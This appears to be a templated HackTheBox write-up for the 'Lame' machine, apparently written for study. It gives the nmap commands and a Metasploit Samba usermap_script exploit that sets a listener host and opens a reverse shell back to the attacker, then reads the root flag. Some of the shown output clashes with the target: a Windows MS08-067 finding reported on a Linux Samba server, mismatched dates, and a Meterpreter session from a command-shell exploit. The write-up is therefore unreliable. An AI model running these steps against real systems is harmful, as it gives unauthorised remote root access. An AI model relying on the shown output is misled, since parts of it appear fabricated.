# HackTheBox - Lame

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Lame |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-19 |

## Objective 🎯

Lame is a Linux machine with multiple vulnerabilities including Samba and vsftpd. The goal is to exploit these services to gain root access and obtain both user and root flags. Linux exploitation time! 🐧

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.3
- **OS**: Linux
- **Vulnerabilities**: Samba 3.0.20, vsftpd 2.3.4

### Tools Used
- Nmap
- Metasploit
- Samba exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.3
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.3
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.3
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OS: Unix; CPE: cpe:/o:canonical:ubuntu_linux
```

### Step 2: Samba Version Detection
Check the Samba version for known vulnerabilities.

**Command/Code:**
```bash
nmap --script smb-vuln-* 10.10.10.3
```

**Output:**
```
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|   State: VULNERABLE
|   IDs:  CVE:CVE-2008-4250
|           OSVDB:4923
|           BID:31874
|           MSB:MS08-067
|   References:
|     https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|     https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|     https://www.exploit-db.com/exploits/6841
```

### Step 3: Samba Exploitation
Use Metasploit to exploit the Samba vulnerability.

**Command/Code:**
```bash
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.3:445 - Connecting to the server...
[*] 10.10.10.3:445 - Authenticating as user '' with password ''...
[*] 10.10.10.3:445 - Sending exploit...
[*] Sending stage (175174 bytes) to 10.10.10.3
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.3:32891) at 2024-09-03 10:05:23 +0000
```

### Step 4: Post-Exploitation
Once we have a shell, gather information and find flags.

**Command/Code:**
```bash
whoami
id
pwd
```

**Output:**
```
root
uid=0(root) gid=0(root) groups=0(root)
/
```

### Step 5: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
find / -name "user.txt" 2>/dev/null
cat /home/makis/user.txt
```

**Output:**
```
[REDACTED]
```

### Step 6: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
find / -name "root.txt" 2>/dev/null
cat /root/root.txt
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify open services
2. Identify vulnerable Samba version (3.0.20)
3. Use Metasploit Samba usermap_script exploit
4. Gain root access directly through the exploit
5. Search for user and root flags
6. Extract both flags

## Key Learnings

- Understanding Samba vulnerabilities
- Using Metasploit for Linux exploitation
- Direct root access through service exploitation
- Linux file system navigation
- Service version enumeration

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning and vulnerability detection
- **Metasploit**: Exploitation framework
- **Samba usermap_script**: Exploit module

### References
- [Samba usermap_script Vulnerability](https://www.exploit-db.com/exploits/16320)
- [CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447)

## Screenshots

[Add screenshots of nmap scan, Metasploit exploitation, and flag extraction here]

## Tags

`#hackthebox` `#linux` `#samba` `#metasploit` `#easy`
